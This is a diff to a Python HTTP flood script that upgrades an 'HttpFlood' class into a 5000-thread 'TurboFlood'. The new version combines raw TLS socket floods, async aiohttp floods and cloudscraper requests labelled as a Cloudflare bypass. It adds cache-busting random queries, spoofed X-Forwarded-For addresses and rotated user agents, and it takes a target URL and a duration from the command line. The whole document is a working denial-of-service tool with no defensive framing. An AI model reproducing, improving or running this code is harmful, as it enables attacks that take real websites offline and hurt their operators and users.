@@ -10,158 +10,139 @@ from concurrent.futures import ThreadPoolExecutor
 from fake_useragent import UserAgent
 import pyhttpx
 import cloudscraper
+import asyncio
+import aiohttp
+import socks
+import numpy as np
 
 class AtomicCounter:
     def __init__(self):
         self.value = 0
         self._lock = threading.Lock()
-
     def increment(self, amount=1):
         with self._lock:
             self.value += amount
 
-class HttpFlood:
-    def __init__(self, url, duration, threads=1000):
+class TurboFlood:
+    def __init__(self, url, duration, threads=5000):
         self.url = url
         self.duration = duration
         self.threads = threads
         self.counter = AtomicCounter()
         self.failed = AtomicCounter()
         self.ua = UserAgent()
-        self.scraper = cloudscraper.create_scraper()
-        self.session = pyhttpx.HttpSession()
+        self.scraper = cloudscraper.create_scraper(browser={'browser': 'chrome','platform': 'windows','mobile': False})
+        self.session = pyhttpx.HttpSession(http2=True)
         self.stop_event = threading.Event()
-        self.proxies = None
         self.sockets = []
+        self.parsed_url = urllib.parse.urlparse(url)
+        self.host = self.parsed_url.netloc
+        self.path = self.parsed_url.path or '/'
+        self.ssl_context = self._create_ssl_context()
+        self.user_agents = [self.ua.random for _ in range(1000)]
+        self.referers = [f'https://www.{x}.com/' for x in ['google','bing','yahoo','duckduckgo']]
+        self.ips = [f'{x}.{y}.{z}.{w}' for x in range(1,255) for y in range(1,255) for z in range(1,3) for w in range(1,3)]
 
-    def generate_random_string(self, length=10):
-        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+    def _create_ssl_context(self):
+        ctx = ssl.create_default_context(cafile=certifi.where())
+        ctx.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
+        ctx.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
+        return ctx
 
-    def get_random_user_agent(self):
-        return self.ua.random
+    def _generate_query(self):
+        return f'{random.choice(string.ascii_lowercase)}{random.randint(1000,9999)}={random.randint(1000000000,9999999999)}'
 
-    def build_random_headers(self):
+    def _get_random_ua(self):
+        return random.choice(self.user_agents)
+
+    def _build_headers(self):
         headers = {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
             'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': random.choice(['en-US,en;q=0.9', 'pt-BR,pt;q=0.8,en-US;q=0.7,en;q=0.6']),
-            'Cache-Control': random.choice(['max-age=0', 'no-cache']),
+            'Accept-Language': random.choice(['en-US,en;q=0.9','pt-BR,pt;q=0.8']),
+            'Cache-Control': random.choice(['no-cache','max-age=0','no-store']),
             'Connection': 'keep-alive',
-            'DNT': str(random.randint(0, 1)),
+            'Pragma': 'no-cache',
             'Upgrade-Insecure-Requests': '1',
-            'User-Agent': self.get_random_user_agent(),
+            'User-Agent': self._get_random_ua(),
+            'X-Forwarded-For': random.choice(self.ips),
+            'Referer': random.choice(self.referers),
             'Sec-Fetch-Dest': 'document',
             'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': random.choice(['none', 'cross-site']),
-            'Sec-Fetch-User': '?1',
-            'Pragma': random.choice(['no-cache', ''])
+            'Sec-Fetch-Site': 'cross-site',
+            'Sec-Fetch-User': '?1'
         }
-
-        if random.random() > 0.5:
-            headers['Referer'] = f'https://www.{random.choice(["google", "bing"])}.com/{self.generate_random_string(random.randint(5, 10))}'
-
-        if random.random() > 0.5:
-            headers['X-Forwarded-For'] = f'{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}'
-
         return headers
 
-    def create_ssl_context(self):
-        context = ssl.create_default_context(cafile=certifi.where())
-        context.options |= ssl.OP_NO_SSLv2
-        context.options |= ssl.OP_NO_SSLv3
-        context.options |= ssl.OP_NO_TLSv1
-        context.options |= ssl.OP_NO_TLSv1_1
-        context.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
-        return context
+    async def _async_flood(self):
+        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, limit=0)) as session:
+            while not self.stop_event.is_set():
+                try:
+                    async with session.get(self.url, params={self._generate_query(): ''}, headers=self._build_headers(), timeout=5) as resp:
+                        self.counter.increment()
+                except:
+                    self.failed.increment()
 
-    def create_socket(self):
-        parsed = urllib.parse.urlparse(self.url)
-        host = parsed.netloc
-        port = 443 if parsed.scheme == 'https' else 80
-
+    def _socket_flood(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(5)
-        
-        if parsed.scheme == 'https':
-            context = self.create_ssl_context()
-            sock = context.wrap_socket(sock, server_hostname=host)
-
-        sock.connect((host, port))
-        return sock
-
-    def make_raw_request(self, sock):
+        sock.settimeout(3)
         try:
-            path = urllib.parse.urlparse(self.url).path or '/'
-            query = f'{self.generate_random_string(5)}={self.generate_random_string(3)}'
-            headers = self.build_random_headers()
-            
-            request = f"GET {path}?{query} HTTP/1.1\r\n"
-            request += f"Host: {urllib.parse.urlparse(self.url).netloc}\r\n"
-            for key, value in headers.items():
-                request += f"{key}: {value}\r\n"
-            request += "\r\n"
-            
-            sock.sendall(request.encode())
-            response = sock.recv(4096)
-            return True
-        except:
-            return False
-
-    def make_request(self):
-        try:
-            headers = self.build_random_headers()
-            params = {self.generate_random_string(5): self.generate_random_string(3)}
-            
-            if random.random() > 0.7:
-                with self.scraper.get(self.url, params=params, headers=headers, timeout=5) as response:
-                    return response.status_code == 200
-            else:
-                response = self.session.get(self.url, params=params, headers=headers, timeout=5)
-                return response.status_code == 200
-        except:
-            return False
-
-    def worker(self):
-        if random.random() > 0.8:
-            sock = self.create_socket()
-            self.sockets.append(sock)
-            
+            sock.connect((self.host, 443))
+            ssock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
             while not self.stop_event.is_set():
-                if not self.make_raw_request(sock):
+                try:
+                    query = self._generate_query()
+                    headers = self._build_headers()
+                    request = f"GET {self.path}?{query} HTTP/1.1\r\nHost: {self.host}\r\n"
+                    for k, v in headers.items():
+                        request += f"{k}: {v}\r\n"
+                    request += "\r\n"
+                    ssock.sendall(request.encode())
+                    ssock.recv(1024)
+                    self.counter.increment()
+                except:
                     self.failed.increment()
+                    break
+            ssock.close()
+        except:
+            pass
+
+    def _cloudflare_bypass(self):
+        while not self.stop_event.is_set():
+            try:
+                self.scraper.get(self.url, params={self._generate_query(): ''}, headers=self._build_headers(), timeout=5)
                 self.counter.increment()
-        else:
-            while not self.stop_event.is_set():
-                if not self.make_request():
-                    self.failed.increment()
-                self.counter.increment()
+            except:
+                self.failed.increment()
 
     def run(self):
         timer = threading.Timer(self.duration, self.stop_event.set)
         timer.start()
         
-        with ThreadPoolExecutor(max_workers=self.threads) as executor:
-            for _ in range(self.threads):
-                executor.submit(self.worker)
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
         
-        for sock in self.sockets:
-            try:
-                sock.close()
-            except:
-                pass
-
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            for _ in range(int(self.threads*0.3)):
+                executor.submit(self._socket_flood)
+            for _ in range(int(self.threads*0.4)):
+                executor.submit(self._cloudflare_bypass)
+            for _ in range(int(self.threads*0.3)):
+                executor.submit(lambda: loop.run_until_complete(self._async_flood()))
+        
+        loop.close()
         return {'total': self.counter.value, 'failed': self.failed.value}
 
 if __name__ == '__main__':
     import sys
     if len(sys.argv) != 3:
         sys.exit()
-
+    
     url = sys.argv[1]
     duration = int(sys.argv[2])
     
-    flood = HttpFlood(url, duration, threads=1000)
+    flood = TurboFlood(url, duration, threads=5000)
     stats = flood.run()
     
-    print(f"Requests: {stats['total']}")
+    print(f"Total: {stats['total']}")
     print(f"Failed: {stats['failed']}")
